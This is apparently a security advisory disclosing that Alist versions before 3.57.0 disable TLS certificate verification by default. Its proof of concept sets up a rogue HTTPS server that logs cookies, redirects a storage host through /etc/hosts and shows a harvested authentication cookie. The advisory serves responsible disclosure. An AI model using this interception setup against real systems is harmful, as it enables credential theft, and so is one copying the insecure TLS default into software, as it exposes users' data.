# Alist has Insecure TLS Config

**GHSA**: GHSA-8jmm-3xwx-w974 | **CVE**: CVE-2026-25160 | **Severity**: critical (CVSS 9.1)

**CWE**: CWE-295

**Affected Packages**:
- **github.com/alist-org/alist/v3** (go): < 3.57.0

## Description

### Summary
The application disables TLS certificate verification by default for all outgoing storage driver communications, making the system vulnerable to Man-in-the-Middle (MitM) attacks. This enables the complete decryption, theft, and manipulation of all data transmitted during storage operations, severely compromising the confidentiality and integrity of user data.

### Details
Certificate verification is disabled by default for all storage driver communications.

The `TlsInsecureSkipVerify` setting is default to true in the `DefaultConfig()` function in [internal/conf/config.go](https://github.com/AlistGo/alist/blob/b4d9beb49cba399842a54fcc33bc95a4a09b7bd4/internal/conf/config.go#L159).

~~~go
func DefaultConfig() *Config {
    // ...
    TlsInsecureSkipVerify: true,
    // ...
}
~~~

This vulnerability enables Man-in-the-Middle (MitM) attacks by disabling TLS certificate verification, allowing attackers to intercept and manipulate all storage communications. Attackers can exploit this through network-level attacks like ARP spoofing, rogue Wi-Fi access points, or compromised internal network equipment to redirect traffic to malicious endpoints. Since certificate validation is skipped, the system will unknowingly establish encrypted connections with attacker-controlled servers, enabling full decryption, data theft, and manipulation of all storage operations without triggering any security warnings. 



#### PoC
The /etc/hosts file was modified to simulate DNS hijacking and redirect www.weiyun.com to a malicious TLS-enabled HTTP server.

The purpose of this Proof of Concept is to demonstrate that the Alist server will establish communication with a malicious server due to disabled certificate verification. This allows interception and theft of authentication cookies used for communicating with other storage providers.

[Video](https://github.com/user-attachments/assets/5b042db0-d830-41d9-9cec-d2ba677ac53d)



##### Setup a malicious https server:

ssl.conf:
~~~
LoadModule ssl_module modules/mod_ssl.so
LoadModule log_config_module modules/mod_log_config.so

Listen 443

LogFormat "%h %l %u %t \"%r\" %>s %b Host:%{Host}i User-Agent:%{User-Agent}i Referer:%{Referer}i Accept:%{Accept}i Cookie:%{Cookie}i" headers
CustomLog "/usr/local/apache2/logs/headers.log" headers

<VirtualHost _default_:443>
    DocumentRoot "/usr/local/apache2/htdocs"
    ServerName localhost

    SSLEngine on
    SSLCertificateFile "/usr/local/apache2/conf/server.crt"
    SSLCertificateKeyFile "/usr/local/apache2/conf/server.key"

    ErrorLog "/usr/local/apache2/logs/ssl_error.log"

    <Directory "/usr/local/apache2/htdocs">
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
    </Directory>
</VirtualHost>
~~~

Dockerfile:
~~~
FROM httpd:2.4

# Copy SSL config
COPY ssl.conf /usr/local/apache2/conf/extra/ssl.conf

# Include SSL config in main httpd.conf
RUN echo "Include conf/extra/ssl.conf" >> /usr/local/apache2/conf/httpd.conf

# Copy certs
COPY certs/server.crt /usr/local/apache2/conf/server.crt
COPY certs/server.key /usr/local/apache2/conf/server.key
~~~

Scripts to run https server:

~~~bash
mkdir certs
openssl req -x509 -nodes -days 365 \
  -newkey rsa:2048 \
  -keyout certs/server.key \
  -out certs/server.crt
docker build -t httpd-ssl .
docker run -dit --name my-https-server httpd-ssl
~~~

##### Run alist
~~~bash
docker run -d --restart=unless-stopped -v /etc/alist:/opt/alist/data -p 5244:5244 -e PUID=0 -e PGID=0 -e UMASK=022 --name="alist" alist666/alist:latest
~~~

Simulate DNS hijacking: Modify container's /etc/hosts to redirect www.weiyun.com to malicious server
~~~
<IP of HTTPS Server>      www.weiyun.com
~~~

In the front end, add a weiyun storage and inspect log on tls server:
~~~
root@f6d0f5bebe60:/usr/local/apache2# cat /usr/local/apache2/logs/headers.log
172.17.0.3 - - [30/Oct/2025:03:52:58 +0000] "GET /disk HTTP/1.1" 404 196 Host:www.weiyun.com User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Referer:- Accept:- Cookie:WhatEverSecret=
~~~

Note that the cookie is in the log.

### Impact
This misconfiguration allows attackers to perform man in the middle attack, which potentially leads to the complete decryption, theft, and manipulation of all data transmitted during storage operations, severely compromising the confidentiality and integrity of user data.

This vulnerability affects all alist deployment.

### Credit
This vulnerability was discovered by:
- XlabAI Team of Tencent Xuanwu Lab
- Atuin Automated Vulnerability Discovery Engine

If there are any questions regarding the vulnerability details, please feel free to reach out for further discussion at xlabai@tencent.com.
